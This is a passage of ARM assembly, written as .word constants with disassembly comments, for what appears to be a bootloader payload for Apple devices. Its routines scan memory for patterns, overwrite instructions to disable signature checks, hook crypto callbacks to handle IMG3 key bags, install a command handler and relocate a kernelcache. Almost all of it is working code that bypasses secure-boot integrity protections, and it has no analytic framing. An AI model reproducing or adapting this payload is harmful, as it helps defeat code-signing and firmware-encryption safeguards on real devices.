    .word  0xE0841106    /* 06A0: add      r1, r4, r6, lsl #2 */
    .word  0xE7812003    /* 06A4: str      r2, [r1, r3] */
    .word  0xE8BD80F0    /* 06A8: pop      {r4, r5, r6, r7, pc} */
    .word  0x00008408    /* 06AC: andeq    r8, r0, r8, lsl #8 */
    .word  0x00004004    /* 06B0: andeq    r4, r0, r4 */

/* ----- lzss_thunk @ 0x06B4 ----- */
lzss_thunk:
    .word  0xE1A01002    /* 06B4: mov      r1, r2 */
    .word  0xE1A02003    /* 06B8: mov      r2, r3 */
    .word  0xEAFFFF12    /* 06BC: b        #0x10030c */

/* ----- find_pattern @ 0x06C0 ----- */
find_pattern:
    .word  0xE92D4070    /* 06C0: push     {r4, r5, r6, lr} */
    .word  0xE1A04002    /* 06C4: mov      r4, r2 */
    .word  0xE1A05000    /* 06C8: mov      r5, r0 */
    .word  0xE2812401    /* 06CC: add      r2, r1, #0x1000000 */
    .word  0xE3A06000    /* 06D0: mov      r6, #0 */
    .word  0xEA00000A    /* 06D4: b        #0x100704 */
    .word  0xE7DCE005    /* 06D8: ldrb     lr, [ip, r5] */
    .word  0xE7D1300C    /* 06DC: ldrb     r3, [r1, ip] */
    .word  0xE153000E    /* 06E0: cmp      r3, lr */
    .word  0xE28CC001    /* 06E4: add      ip, ip, #1 */
    .word  0x0A000001    /* 06E8: beq      #0x1006f4 */
    .word  0xE35E00FF    /* 06EC: cmp      lr, #0xff */
    .word  0x1A000002    /* 06F0: bne      #0x100700 */
    .word  0xE15C0004    /* 06F4: cmp      ip, r4 */
    .word  0xBAFFFFF6    /* 06F8: blt      #0x1006d8 */
    .word  0x08BD8070    /* 06FC: popeq    {r4, r5, r6, pc} */
    .word  0xE2811002    /* 0700: add      r1, r1, #2 */
    .word  0xE1510002    /* 0704: cmp      r1, r2 */
    .word  0xE1A00001    /* 0708: mov      r0, r1 */
    .word  0x31A0C006    /* 070C: movlo    ip, r6 */
    .word  0x3AFFFFF7    /* 0710: blo      #0x1006f4 */
    .word  0xE3A00000    /* 0714: mov      r0, #0 */
    .word  0xE8BD8070    /* 0718: pop      {r4, r5, r6, pc} */

/* ----- hook_crypto_callbacks @ 0x071C ----- */
hook_crypto_callbacks:
    .word  0xE92D40F0    /* 071C: push     {r4, r5, r6, r7, lr} */
    .word  0xE59F30A0    /* 0720: ldr      r3, [pc, #0xa0] */
    .word  0xE59F40A0    /* 0724: ldr      r4, [pc, #0xa0] */
    .word  0xE5933000    /* 0728: ldr      r3, [r3] */
    .word  0xE5942000    /* 072C: ldr      r2, [r4] */
    .word  0xE5933014    /* 0730: ldr      r3, [r3, #0x14] */
    .word  0xE24DD008    /* 0734: sub      sp, sp, #8 */
    .word  0xE5921004    /* 0738: ldr      r1, [r2, #4] */
    .word  0xE59F008C    /* 073C: ldr      r0, [pc, #0x8c] */
    .word  0xE3A02010    /* 0740: mov      r2, #0x10 */
    .word  0xE5937008    /* 0744: ldr      r7, [r3, #8] */
    .word  0xEBFFFFDC    /* 0748: bl       #0x1006c0 */
    .word  0xE5943000    /* 074C: ldr      r3, [r4] */
    .word  0xE59F607C    /* 0750: ldr      r6, [pc, #0x7c] */
    .word  0xE280C001    /* 0754: add      ip, r0, #1 */
    .word  0xE5931004    /* 0758: ldr      r1, [r3, #4] */
    .word  0xE3A02008    /* 075C: mov      r2, #8 */
    .word  0xE59F0070    /* 0760: ldr      r0, [pc, #0x70] */
    .word  0xE586C000    /* 0764: str      ip, [r6] */
    .word  0xEBFFFFD4    /* 0768: bl       #0x1006c0 */
    .word  0xE28D4008    /* 076C: add      r4, sp, #8 */
    .word  0xE3A03005    /* 0770: mov      r3, #5 */
    .word  0xE5643001    /* 0774: strb     r3, [r4, #-1]! */
    .word  0xE59F505C    /* 0778: ldr      r5, [pc, #0x5c] */
    .word  0xE2803001    /* 077C: add      r3, r0, #1 */
    .word  0xE5853000    /* 0780: str      r3, [r5] */
    .word  0xE3A01000    /* 0784: mov      r1, #0 */
    .word  0xE5970064    /* 0788: ldr      r0, [r7, #0x64] */
    .word  0xE1A0E00F    /* 078C: mov      lr, pc */
    .word  0xE12FFF13    /* 0790: bx       r3 */
    .word  0xE3A02001    /* 0794: mov      r2, #1 */
    .word  0xE3A00000    /* 0798: mov      r0, #0 */
    .word  0xE1A01004    /* 079C: mov      r1, r4 */
    .word  0xE58D0000    /* 07A0: str      r0, [sp] */
    .word  0xE1A03002    /* 07A4: mov      r3, r2 */
    .word  0xE1A0E00F    /* 07A8: mov      lr, pc */
    .word  0xE596F000    /* 07AC: ldr      pc, [r6] */
    .word  0xE5970064    /* 07B0: ldr      r0, [r7, #0x64] */
    .word  0xE3A01001    /* 07B4: mov      r1, #1 */
    .word  0xE1A0E00F    /* 07B8: mov      lr, pc */
    .word  0xE595F000    /* 07BC: ldr      pc, [r5] */
    .word  0xE28DD008    /* 07C0: add      sp, sp, #8 */
    .word  0xE8BD80F0    /* 07C4: pop      {r4, r5, r6, r7, pc} */
    .word  0x0010257C    /* 07C8: andseq   r2, r0, ip, ror r5 */
    .word  0x0010256C    /* 07CC: andseq   r2, r0, ip, ror #10 */
    .word  0x001024D8    /* 07D0: ldrsbeq  r2, [r0], -r8 */
    .word  0x00102570    /* 07D4: andseq   r2, r0, r0, ror r5 */
    .word  0x001024D0    /* 07D8: ldrsbeq  r2, [r0], -r0 */
    .word  0x00102584    /* 07DC: andseq   r2, r0, r4, lsl #11 */

/* ----- patch_sigchecks @ 0x07E0 ----- */
patch_sigchecks:
    .word  0xE59F30BC    /* 07E0: ldr      r3, [pc, #0xbc] */
    .word  0xE5933000    /* 07E4: ldr      r3, [r3] */
    .word  0xE3530000    /* 07E8: cmp      r3, #0 */
    .word  0xE92D4030    /* 07EC: push     {r4, r5, lr} */
    .word  0xE1A04000    /* 07F0: mov      r4, r0 */
    .word  0xE2805701    /* 07F4: add      r5, r0, #0x40000 */
    .word  0x1A000013    /* 07F8: bne      #0x10084c */
    .word  0xE59F00A4    /* 07FC: ldr      r0, [pc, #0xa4] */
    .word  0xE1A01004    /* 0800: mov      r1, r4 */
    .word  0xE3A02008    /* 0804: mov      r2, #8 */
    .word  0xEBFFFFAC    /* 0808: bl       #0x1006c0 */
    .word  0xE1500005    /* 080C: cmp      r0, r5 */
    .word  0x88BD8030    /* 0810: pophi    {r4, r5, pc} */
    .word  0xE59F3090    /* 0814: ldr      r3, [pc, #0x90] */
    .word  0xE3A02012    /* 0818: mov      r2, #0x12 */
    .word  0xE5803000    /* 081C: str      r3, [r0] */
    .word  0xE1A01004    /* 0820: mov      r1, r4 */
    .word  0xE59F0084    /* 0824: ldr      r0, [pc, #0x84] */
    .word  0xEBFFFFA4    /* 0828: bl       #0x1006c0 */
    .word  0xE59F2080    /* 082C: ldr      r2, [pc, #0x80] */
    .word  0xEA000001    /* 0830: b        #0x10083c */
    .word  0xE3A03C22    /* 0834: mov      r3, #0x2200 */
    .word  0xE14030B2    /* 0838: strh     r3, [r0, #-2] */
    .word  0xE0D030B2    /* 083C: ldrh     r3, [r0], #2 */
    .word  0xE1530002    /* 0840: cmp      r3, r2 */
    .word  0x1AFFFFFA    /* 0844: bne      #0x100834 */
    .word  0xE8BD8030    /* 0848: pop      {r4, r5, pc} */
    .word  0xE59F0064    /* 084C: ldr      r0, [pc, #0x64] */
    .word  0xE1A01004    /* 0850: mov      r1, r4 */
    .word  0xE3A0200A    /* 0854: mov      r2, #0xa */
    .word  0xEBFFFF98    /* 0858: bl       #0x1006c0 */
    .word  0xE2803008    /* 085C: add      r3, r0, #8 */
    .word  0xE1530005    /* 0860: cmp      r3, r5 */
    .word  0x88BD8030    /* 0864: pophi    {r4, r5, pc} */
    .word  0xE3A03A02    /* 0868: mov      r3, #0x2000 */
    .word  0xE1C030B8    /* 086C: strh     r3, [r0, #8] */
    .word  0xE3A02010    /* 0870: mov      r2, #0x10 */
    .word  0xE1A01004    /* 0874: mov      r1, r4 */
    .word  0xE59F003C    /* 0878: ldr      r0, [pc, #0x3c] */
    .word  0xEBFFFF8F    /* 087C: bl       #0x1006c0 */
    .word  0xE59F2038    /* 0880: ldr      r2, [pc, #0x38] */
    .word  0xEA000001    /* 0884: b        #0x100890 */
    .word  0xE3A03C22    /* 0888: mov      r3, #0x2200 */
    .word  0xE1C030B6    /* 088C: strh     r3, [r0, #6] */
    .word  0xE1D030B8    /* 0890: ldrh     r3, [r0, #8] */
    .word  0xE1530002    /* 0894: cmp      r3, r2 */
    .word  0xE2800002    /* 0898: add      r0, r0, #2 */
    .word  0x1AFFFFF9    /* 089C: bne      #0x100888 */
    .word  0xE8BD8030    /* 08A0: pop      {r4, r5, pc} */
    .word  0x00102538    /* 08A4: andseq   r2, r0, r8, lsr r5 */
    .word  0x0010245C    /* 08A8: andseq   r2, r0, ip, asr r4 */
    .word  0x20002000    /* 08AC: andhs    r2, r0, r0 */
    .word  0x0010246E    /* 08B0: andseq   r2, r0, lr, ror #8 */
    .word  0x00009207    /* 08B4: andeq    sb, r0, r7, lsl #4 */
    .word  0x00102464    /* 08B8: andseq   r2, r0, r4, ror #8 */
    .word  0x00102480    /* 08BC: andseq   r2, r0, r0, lsl #9 */
    .word  0x00009208    /* 08C0: andeq    sb, r0, r8, lsl #4 */

/* ----- memset_bytes @ 0x08C4 ----- */
memset_bytes:
    .word  0xE20110FF    /* 08C4: and      r1, r1, #0xff */
    .word  0xE3A03000    /* 08C8: mov      r3, #0 */
    .word  0xEA000001    /* 08CC: b        #0x1008d8 */
    .word  0xE7C31000    /* 08D0: strb     r1, [r3, r0] */
    .word  0xE2833001    /* 08D4: add      r3, r3, #1 */
    .word  0xE1530002    /* 08D8: cmp      r3, r2 */
    .word  0x1AFFFFFB    /* 08DC: bne      #0x1008d0 */
    .word  0xE12FFF1E    /* 08E0: bx       lr */

/* ----- memcpy_words @ 0x08E4 ----- */
memcpy_words:
    .word  0xE52DE004    /* 08E4: str      lr, [sp, #-4]! */
    .word  0xE3A0E000    /* 08E8: mov      lr, #0 */
    .word  0xE1A02122    /* 08EC: lsr      r2, r2, #2 */
    .word  0xE1A0C00E    /* 08F0: mov      ip, lr */
    .word  0xEA000002    /* 08F4: b        #0x100904 */
    .word  0xE79C3001    /* 08F8: ldr      r3, [ip, r1] */
    .word  0xE78C3000    /* 08FC: str      r3, [ip, r0] */
    .word  0xE28CC004    /* 0900: add      ip, ip, #4 */
    .word  0xE15E0002    /* 0904: cmp      lr, r2 */
    .word  0xE28EE001    /* 0908: add      lr, lr, #1 */
    .word  0x3AFFFFF9    /* 090C: blo      #0x1008f8 */
    .word  0xE49DF004    /* 0910: pop      {pc} */

/* ----- strcpy @ 0x0914 ----- */
strcpy:
    .word  0xEA000000    /* 0914: b        #0x10091c */
    .word  0xE5403001    /* 0918: strb     r3, [r0, #-1] */
    .word  0xE5D13000    /* 091C: ldrb     r3, [r1] */
    .word  0xE3530000    /* 0920: cmp      r3, #0 */
    .word  0xE1A02000    /* 0924: mov      r2, r0 */
    .word  0xE2811001    /* 0928: add      r1, r1, #1 */
    .word  0xE2800001    /* 092C: add      r0, r0, #1 */
    .word  0x1AFFFFF8    /* 0930: bne      #0x100918 */
    .word  0xE5C23000    /* 0934: strb     r3, [r2] */
    .word  0xE12FFF1E    /* 0938: bx       lr */

/* ----- strcmp @ 0x093C ----- */
strcmp:
    .word  0xE1A02000    /* 093C: mov      r2, r0 */
    .word  0xEA000003    /* 0940: b        #0x100954 */
    .word  0xE1530000    /* 0944: cmp      r3, r0 */
    .word  0x0A000001    /* 0948: beq      #0x100954 */
    .word  0xE0600003    /* 094C: rsb      r0, r0, r3 */
    .word  0xE12FFF1E    /* 0950: bx       lr */
    .word  0xE5D23000    /* 0954: ldrb     r3, [r2] */
    .word  0xE3530000    /* 0958: cmp      r3, #0 */
    .word  0xE5D10000    /* 095C: ldrb     r0, [r1] */
    .word  0xE2822001    /* 0960: add      r2, r2, #1 */
    .word  0xE2811001    /* 0964: add      r1, r1, #1 */
    .word  0x1AFFFFF5    /* 0968: bne      #0x100944 */
    .word  0xE2600000    /* 096C: rsb      r0, r0, #0 */
    .word  0xE12FFF1E    /* 0970: bx       lr */

/* ----- ret_stub @ 0x0974 ----- */
ret_stub:
    .word  0xE12FFF1E    /* 0974: bx       lr */

/* ----- img3_patch_kbag @ 0x0978 ----- */
img3_patch_kbag:
    .word  0xE92D41F0    /* 0978: push     {r4, r5, r6, r7, r8, lr} */
    .word  0xE59F2150    /* 097C: ldr      r2, [pc, #0x150] */
    .word  0xE24DD04C    /* 0980: sub      sp, sp, #0x4c */
    .word  0xE1A07000    /* 0984: mov      r7, r0 */
    .word  0xE2804014    /* 0988: add      r4, r0, #0x14 */
    .word  0xEA000001    /* 098C: b        #0x100998 */
    .word  0xE5943004    /* 0990: ldr      r3, [r4, #4] */
    .word  0xE0844003    /* 0994: add      r4, r4, r3 */
    .word  0xE5943000    /* 0998: ldr      r3, [r4] */
    .word  0xE0535002    /* 099C: subs     r5, r3, r2 */
    .word  0x13A05001    /* 09A0: movne    r5, #1 */
    .word  0xE3530000    /* 09A4: cmp      r3, #0 */
    .word  0x11530002    /* 09A8: cmpne    r3, r2 */
    .word  0x1AFFFFF7    /* 09AC: bne      #0x100990 */
    .word  0xE3550000    /* 09B0: cmp      r5, #0 */
    .word  0x13E00000    /* 09B4: mvnne    r0, #0 */
    .word  0x1A000043    /* 09B8: bne      #0x100acc */
    .word  0xE5943010    /* 09BC: ldr      r3, [r4, #0x10] */
    .word  0xE3530C01    /* 09C0: cmp      r3, #0x100 */
    .word  0xE59F310C    /* 09C4: ldr      r3, [pc, #0x10c] */
    .word  0xE59F810C    /* 09C8: ldr      r8, [pc, #0x10c] */
    .word  0xE5843000    /* 09CC: str      r3, [r4] */
    .word  0xE2841014    /* 09D0: add      r1, r4, #0x14 */
    .word  0xE28D600C    /* 09D4: add      r6, sp, #0xc */
    .word  0x1A00000D    /* 09D8: bne      #0x100a14 */
    .word  0xE59F30FC    /* 09DC: ldr      r3, [pc, #0xfc] */
    .word  0xE1A02006    /* 09E0: mov      r2, r6 */
    .word  0xE58D3000    /* 09E4: str      r3, [sp] */
    .word  0xE58D5008    /* 09E8: str      r5, [sp, #8] */
    .word  0xE3A03030    /* 09EC: mov      r3, #0x30 */
    .word  0xE58D5004    /* 09F0: str      r5, [sp, #4] */
    .word  0xE3A00011    /* 09F4: mov      r0, #0x11 */
    .word  0xE1A0E00F    /* 09F8: mov      lr, pc */
    .word  0xE598F000    /* 09FC: ldr      pc, [r8] */
    .word  0xE1A00006    /* 0A00: mov      r0, r6 */
    .word  0xE3A01030    /* 0A04: mov      r1, #0x30 */
    .word  0xEBFFFFD9    /* 0A08: bl       #0x100974 */
    .word  0xE59F20C0    /* 0A0C: ldr      r2, [pc, #0xc0] */
    .word  0xEA000017    /* 0A10: b        #0x100a74 */
    .word  0xE3A03C02    /* 0A14: mov      r3, #0x200 */
    .word  0xE1A02006    /* 0A18: mov      r2, r6 */
    .word  0xE88D0028    /* 0A1C: stm      sp, {r3, r5} */
    .word  0xE2433E1E    /* 0A20: sub      r3, r3, #0x1e0 */
    .word  0xE58D5008    /* 0A24: str      r5, [sp, #8] */
    .word  0xE3A00011    /* 0A28: mov      r0, #0x11 */
    .word  0xE1A0E00F    /* 0A2C: mov      lr, pc */
    .word  0xE598F000    /* 0A30: ldr      pc, [r8] */
    .word  0xE1A00006    /* 0A34: mov      r0, r6 */
    .word  0xE3A01020    /* 0A38: mov      r1, #0x20 */
    .word  0xEBFFFFCC    /* 0A3C: bl       #0x100974 */
    .word  0xE5973038    /* 0A40: ldr      r3, [r7, #0x38] */
    .word  0xE2862010    /* 0A44: add      r2, r6, #0x10 */
    .word  0xE2871040    /* 0A48: add      r1, r7, #0x40 */
    .word  0xE98D0044    /* 0A4C: stmib    sp, {r2, r6} */
    .word  0xE58D5000    /* 0A50: str      r5, [sp] */
    .word  0xE243300C    /* 0A54: sub      r3, r3, #0xc */
    .word  0xE1A02001    /* 0A58: mov      r2, r1 */
    .word  0xE3A00011    /* 0A5C: mov      r0, #0x11 */
    .word  0xE1A0E00F    /* 0A60: mov      lr, pc */
    .word  0xE598F000    /* 0A64: ldr      pc, [r8] */
    .word  0xEA000016    /* 0A68: b        #0x100ac8 */
    .word  0xE5943004    /* 0A6C: ldr      r3, [r4, #4] */
    .word  0xE0844003    /* 0A70: add      r4, r4, r3 */
    .word  0xE5943000    /* 0A74: ldr      r3, [r4] */
    .word  0xE1530002    /* 0A78: cmp      r3, r2 */
    .word  0x13530000    /* 0A7C: cmpne    r3, #0 */
    .word  0x03A05000    /* 0A80: moveq    r5, #0 */
    .word  0x13A05001    /* 0A84: movne    r5, #1 */
    .word  0x1AFFFFF7    /* 0A88: bne      #0x100a6c */
    .word  0xE59F3044    /* 0A8C: ldr      r3, [pc, #0x44] */
    .word  0xE5843000    /* 0A90: str      r3, [r4] */
    .word  0xE28DC00C    /* 0A94: add      ip, sp, #0xc */
    .word  0xE5973038    /* 0A98: ldr      r3, [r7, #0x38] */
    .word  0xE28C0010    /* 0A9C: add      r0, ip, #0x10 */
    .word  0xE3A02202    /* 0AA0: mov      r2, #0x20000000 */
    .word  0xE2871040    /* 0AA4: add      r1, r7, #0x40 */
    .word  0xE58D2000    /* 0AA8: str      r2, [sp] */
    .word  0xE98D1001    /* 0AAC: stmib    sp, {r0, ip} */
    .word  0xE243300C    /* 0AB0: sub      r3, r3, #0xc */
    .word  0xE3A00011    /* 0AB4: mov      r0, #0x11 */
    .word  0xE1A02001    /* 0AB8: mov      r2, r1 */
    .word  0xE59FC018    /* 0ABC: ldr      ip, [pc, #0x18] */
    .word  0xE1A0E00F    /* 0AC0: mov      lr, pc */
    .word  0xE59CF000    /* 0AC4: ldr      pc, [ip] */
    .word  0xE1A00005    /* 0AC8: mov      r0, r5 */
    .word  0xE28DD04C    /* 0ACC: add      sp, sp, #0x4c */
    .word  0xE8BD81F0    /* 0AD0: pop      {r4, r5, r6, r7, r8, pc} */
    .word  0x4B424147    /* 0AD4: blmi     #0x1190ff8 */
    .word  0x53484954    /* 0AD8: movtpl   r4, #0x8954 */
    .word  0x00102520    /* 0ADC: andseq   r2, r0, r0, lsr #10 */
    .word  0x20000200    /* 0AE0: andhs    r0, r0, r0, lsl #4 */

/* ----- install_cmd_handler @ 0x0AE4 ----- */
install_cmd_handler:
    .word  0xE92D4010    /* 0AE4: push     {r4, lr} */
    .word  0xE59F3074    /* 0AE8: ldr      r3, [pc, #0x74] */
    .word  0xE5933000    /* 0AEC: ldr      r3, [r3] */
    .word  0xE24DD00C    /* 0AF0: sub      sp, sp, #0xc */
    .word  0xE5931000    /* 0AF4: ldr      r1, [r3] */
    .word  0xE3A02010    /* 0AF8: mov      r2, #0x10 */
    .word  0xE59F0064    /* 0AFC: ldr      r0, [pc, #0x64] */
    .word  0xEBFFFEEE    /* 0B00: bl       #0x1006c0 */
    .word  0xE59F4060    /* 0B04: ldr      r4, [pc, #0x60] */
    .word  0xE59F3060    /* 0B08: ldr      r3, [pc, #0x60] */
    .word  0xE2802001    /* 0B0C: add      r2, r0, #1 */
    .word  0xE5832000    /* 0B10: str      r2, [r3] */
    .word  0xE1A00004    /* 0B14: mov      r0, r4 */
    .word  0xE3A01010    /* 0B18: mov      r1, #0x10 */
    .word  0xEBFFFF94    /* 0B1C: bl       #0x100974 */
    .word  0xE3A02000    /* 0B20: mov      r2, #0 */
    .word  0xE3A00010    /* 0B24: mov      r0, #0x10 */
    .word  0xE3A03C01    /* 0B28: mov      r3, #0x100 */
    .word  0xE58D3000    /* 0B2C: str      r3, [sp] */
    .word  0xE58D2008    /* 0B30: str      r2, [sp, #8] */
    .word  0xE58D2004    /* 0B34: str      r2, [sp, #4] */
    .word  0xE1A01004    /* 0B38: mov      r1, r4 */
    .word  0xE1A02004    /* 0B3C: mov      r2, r4 */
    .word  0xE1A03000    /* 0B40: mov      r3, r0 */
    .word  0xE59FC028    /* 0B44: ldr      ip, [pc, #0x28] */
    .word  0xE1A0E00F    /* 0B48: mov      lr, pc */
    .word  0xE59CF000    /* 0B4C: ldr      pc, [ip] */
    .word  0xE1A00004    /* 0B50: mov      r0, r4 */
    .word  0xE3A01010    /* 0B54: mov      r1, #0x10 */
    .word  0xE28DD00C    /* 0B58: add      sp, sp, #0xc */
    .word  0xE8BD4010    /* 0B5C: pop      {r4, lr} */
    .word  0xEAFFFF83    /* 0B60: b        #0x100974 */
    .word  0x0010256C    /* 0B64: andseq   r2, r0, ip, ror #10 */
    .word  0x001024A4    /* 0B68: andseq   r2, r0, r4, lsr #9 */
    .word  0x001024C0    /* 0B6C: andseq   r2, r0, r0, asr #9 */
    .word  0x0010253C    /* 0B70: andseq   r2, r0, ip, lsr r5 */
    .word  0x00102520    /* 0B74: andseq   r2, r0, r0, lsr #10 */

/* ----- relocate_kernelcache @ 0x0B78 ----- */
relocate_kernelcache:
    .word  0xE59FC36C    /* 0B78: ldr      ip, [pc, #0x36c] */
    .word  0xE92D4DF0    /* 0B7C: push     {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xE59CC000    /* 0B80: ldr      ip, [ip] */
    .word  0xE59CC008    /* 0B84: ldr      ip, [ip, #8] */
    .word  0xE24DD02C    /* 0B88: sub      sp, sp, #0x2c */
    .word  0xE28C5402    /* 0B8C: add      r5, ip, #0x2000000 */
    .word  0xE0801001    /* 0B90: add      r1, r0, r1 */
    .word  0xE1A04002    /* 0B94: mov      r4, r2 */
    .word  0xE58D1010    /* 0B98: str      r1, [sp, #0x10] */
    .word  0xE59F234C    /* 0B9C: ldr      r2, [pc, #0x34c] */
    .word  0xE3A01000    /* 0BA0: mov      r1, #0 */
    .word  0xE0843003    /* 0BA4: add      r3, r4, r3 */
    .word  0xE1A08000    /* 0BA8: mov      r8, r0 */
    .word  0xE1A00005    /* 0BAC: mov      r0, r5 */
    .word  0xE58D300C    /* 0BB0: str      r3, [sp, #0xc] */
    .word  0xEBFFFF42    /* 0BB4: bl       #0x1008c4 */
    .word  0xE59FC334    /* 0BB8: ldr      ip, [pc, #0x334] */
    .word  0xE59F0334    /* 0BBC: ldr      r0, [pc, #0x334] */
    .word  0xE3A02000    /* 0BC0: mov      r2, #0 */
    .word  0xE3A01020    /* 0BC4: mov      r1, #0x20 */
    .word  0xE0853002    /* 0BC8: add      r3, r5, r2 */
    .word  0xE2822001    /* 0BCC: add      r2, r2, #1 */
    .word  0xE1520000    /* 0BD0: cmp      r2, r0 */
    .word  0xE7C3100C    /* 0BD4: strb     r1, [r3, ip] */
    .word  0x1AFFFFFA    /* 0BD8: bne      #0x100bc8 */
    .word  0xE59F0318    /* 0BDC: ldr      r0, [pc, #0x318] */
    .word  0xE3A02000    /* 0BE0: mov      r2, #0 */
    .word  0xE3A01A01    /* 0BE4: mov      r1, #0x1000 */
    .word  0xE0853002    /* 0BE8: add      r3, r5, r2 */
    .word  0xE2822004    /* 0BEC: add      r2, r2, #4 */
    .word  0xE3520B01    /* 0BF0: cmp      r2, #0x400 */
    .word  0xE7831000    /* 0BF4: str      r1, [r3, r0] */
    .word  0x1AFFFFFA    /* 0BF8: bne      #0x100be8 */
    .word  0xE59F02FC    /* 0BFC: ldr      r0, [pc, #0x2fc] */
    .word  0xE2422B01    /* 0C00: sub      r2, r2, #0x400 */
    .word  0xE0853002    /* 0C04: add      r3, r5, r2 */
    .word  0xE2822004    /* 0C08: add      r2, r2, #4 */
    .word  0xE3520901    /* 0C0C: cmp      r2, #0x4000 */
    .word  0xE7831000    /* 0C10: str      r1, [r3, r0] */
    .word  0x1AFFFFFA    /* 0C14: bne      #0x100c04 */
    .word  0xE59F12E4    /* 0C18: ldr      r1, [pc, #0x2e4] */
    .word  0xE3A00000    /* 0C1C: mov      r0, #0 */
    .word  0xE58D4014    /* 0C20: str      r4, [sp, #0x14] */
    .word  0xE58D0000    /* 0C24: str      r0, [sp] */
    .word  0xEA000007    /* 0C28: b        #0x100c4c */
    .word  0xE59DC000    /* 0C2C: ldr      ip, [sp] */
    .word  0xE7DC3004    /* 0C30: ldrb     r3, [ip, r4] */
    .word  0xE7C23001    /* 0C34: strb     r3, [r2, r1] */
    .word  0xE59DE014    /* 0C38: ldr      lr, [sp, #0x14] */
    .word  0xE28CC001    /* 0C3C: add      ip, ip, #1 */
    .word  0xE28EE001    /* 0C40: add      lr, lr, #1 */
    .word  0xE58DE014    /* 0C44: str      lr, [sp, #0x14] */
    .word  0xE58DC000    /* 0C48: str      ip, [sp] */
    .word  0xE59D0000    /* 0C4C: ldr      r0, [sp] */
    .word  0xE59DC014    /* 0C50: ldr      ip, [sp, #0x14] */
    .word  0xE59DE00C    /* 0C54: ldr      lr, [sp, #0xc] */
    .word  0xE3500011    /* 0C58: cmp      r0, #0x11 */
    .word  0xC3A03000    /* 0C5C: movgt    r3, #0 */
    .word  0xD3A03001    /* 0C60: movle    r3, #1 */
    .word  0xE15C000E    /* 0C64: cmp      ip, lr */
    .word  0x23A03000    /* 0C68: movhs    r3, #0 */
    .word  0xE3530000    /* 0C6C: cmp      r3, #0 */
    .word  0xE0852000    /* 0C70: add      r2, r5, r0 */
    .word  0x1AFFFFEC    /* 0C74: bne      #0x100c2c */
    .word  0xE3500000    /* 0C78: cmp      r0, #0 */
    .word  0x0A000096    /* 0C7C: beq      #0x100edc */
    .word  0xE59F4280    /* 0C80: ldr      r4, [pc, #0x280] */
    .word  0xE59F6280    /* 0C84: ldr      r6, [pc, #0x280] */
    .word  0xE1A01004    /* 0C88: mov      r1, r4 */
    .word  0xE1A00005    /* 0C8C: mov      r0, r5 */
    .word  0xE2444001    /* 0C90: sub      r4, r4, #1 */
    .word  0xEBFFFDE5    /* 0C94: bl       #0x100430 */
    .word  0xE1540006    /* 0C98: cmp      r4, r6 */
    .word  0x1AFFFFF9    /* 0C9C: bne      #0x100c88 */
    .word  0xE3A04000    /* 0CA0: mov      r4, #0 */
    .word  0xE1A00005    /* 0CA4: mov      r0, r5 */
    .word  0xE59F1248    /* 0CA8: ldr      r1, [pc, #0x248] */
    .word  0xE3A0A001    /* 0CAC: mov      sl, #1 */
    .word  0xE5CD401B    /* 0CB0: strb     r4, [sp, #0x1b] */
    .word  0xE59FB23C    /* 0CB4: ldr      fp, [pc, #0x23c] */
    .word  0xEBFFFDDC    /* 0CB8: bl       #0x100430 */
    .word  0xE58DA008    /* 0CBC: str      sl, [sp, #8] */
    .word  0xE1A07004    /* 0CC0: mov      r7, r4 */
    .word  0xE59F0244    /* 0CC4: ldr      r0, [pc, #0x244] */
    .word  0xE59D2000    /* 0CC8: ldr      r2, [sp] */
    .word  0xE7953000    /* 0CCC: ldr      r3, [r5, r0] */
    .word  0xE1530002    /* 0CD0: cmp      r3, r2 */
    .word  0xC7852000    /* 0CD4: strgt    r2, [r5, r0] */
    .word  0xE59F3230    /* 0CD8: ldr      r3, [pc, #0x230] */
    .word  0xE7952003    /* 0CDC: ldr      r2, [r5, r3] */
    .word  0xE28DE02C    /* 0CE0: add      lr, sp, #0x2c */
    .word  0xE3520002    /* 0CE4: cmp      r2, #2 */
    .word  0xE28A0001    /* 0CE8: add      r0, sl, #1 */
    .word  0xE08EC00A    /* 0CEC: add      ip, lr, sl */
    .word  0xCA00000B    /* 0CF0: bgt      #0x100d24 */
    .word  0xE3A02001    /* 0CF4: mov      r2, #1 */
    .word  0xE7852003    /* 0CF8: str      r2, [r5, r3] */
    .word  0xE59DE008    /* 0CFC: ldr      lr, [sp, #8] */
    .word  0xE5DD301B    /* 0D00: ldrb     r3, [sp, #0x1b] */
    .word  0xE18E3003    /* 0D04: orr      r3, lr, r3 */
    .word  0xE5CD301B    /* 0D08: strb     r3, [sp, #0x1b] */
    .word  0xE59F21E0    /* 0D0C: ldr      r2, [pc, #0x1e0] */
    .word  0xE08B3005    /* 0D10: add      r3, fp, r5 */
    .word  0xE7D33002    /* 0D14: ldrb     r3, [r3, r2] */
    .word  0xE1A0A000    /* 0D18: mov      sl, r0 */
    .word  0xE54C3011    /* 0D1C: strb     r3, [ip, #-0x11] */
    .word  0xEA00000A    /* 0D20: b        #0x100d50 */
    .word  0xE59F31E8    /* 0D24: ldr      r3, [pc, #0x1e8] */
    .word  0xE7951003    /* 0D28: ldr      r1, [r5, r3] */
    .word  0xE1A03241    /* 0D2C: asr      r3, r1, #4 */
    .word  0xE3C3300F    /* 0D30: bic      r3, r3, #0xf */
    .word  0xE2422003    /* 0D34: sub      r2, r2, #3 */
    .word  0xE28DE02C    /* 0D38: add      lr, sp, #0x2c */
    .word  0xE1822003    /* 0D3C: orr      r2, r2, r3 */
    .word  0xE08E3000    /* 0D40: add      r3, lr, r0 */
    .word  0xE54C1011    /* 0D44: strb     r1, [ip, #-0x11] */
    .word  0xE5432011    /* 0D48: strb     r2, [r3, #-0x11] */
    .word  0xE280A001    /* 0D4C: add      sl, r0, #1 */
    .word  0xE59D0008    /* 0D50: ldr      r0, [sp, #8] */
    .word  0xE1A03080    /* 0D54: lsl      r3, r0, #1 */
    .word  0xE21330FF    /* 0D58: ands     r3, r3, #0xff */
    .word  0xE58D3008    /* 0D5C: str      r3, [sp, #8] */
    .word  0x01A01003    /* 0D60: moveq    r1, r3 */
    .word  0x01A02008    /* 0D64: moveq    r2, r8 */
    .word  0x0A000008    /* 0D68: beq      #0x100d90 */
    .word  0xEA00000E    /* 0D6C: b        #0x100dac */
    .word  0xE59D3010    /* 0D70: ldr      r3, [sp, #0x10] */
    .word  0xE1520003    /* 0D74: cmp      r2, r3 */
    .word  0xE2822001    /* 0D78: add      r2, r2, #1 */
    .word  0x2A000056    /* 0D7C: bhs      #0x100edc */
    .word  0xE281C01B    /* 0D80: add      ip, r1, #0x1b */
